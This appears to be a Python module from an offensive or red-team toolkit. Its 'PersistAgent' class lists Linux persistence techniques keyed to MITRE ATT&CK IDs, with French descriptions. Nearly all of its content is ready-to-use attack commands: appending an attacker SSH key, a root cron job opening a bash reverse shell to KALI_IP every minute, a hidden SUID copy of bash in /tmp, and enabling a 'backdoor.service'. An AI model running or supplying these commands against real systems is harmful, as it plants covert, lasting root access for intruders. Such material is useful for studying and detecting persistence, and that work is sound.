"""
PersistAgent — Mise en place de persistance.
TA0003 Persistence — T1098 Account Manipulation
"""


class PersistAgent:
    def __init__(self, target: str):
        self.target = target

    def run(self) -> dict:
        methods = [
            {
                "technique": "T1098.004",
                "name": "SSH Authorized Keys",
                "command": "echo '<PUBKEY>' >> ~/.ssh/authorized_keys",
                "description": "Ajout d'une clé publique SSH pour accès permanent",
            },
            {
                "technique": "T1053.003",
                "name": "Cron Job",
                "command": "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/KALI_IP/5555 0>&1\"' >> /etc/crontab",
                "description": "Reverse shell programmé toutes les minutes",
            },
            {
                "technique": "T1548.001",
                "name": "SUID Binary",
                "command": "cp /bin/bash /tmp/.hidden && chmod 4755 /tmp/.hidden",
                "description": "Copie de bash avec bit SUID pour escalade ultérieure",
            },
            {
                "technique": "T1543.002",
                "name": "Systemd Service",
                "command": "systemctl enable --now backdoor.service",
                "description": "Service systemd malveillant lancé au démarrage",
            },
        ]

        return {
            "technique": "T1098",
            "tactic": "TA0003",
            "persistence_methods": methods,
        }
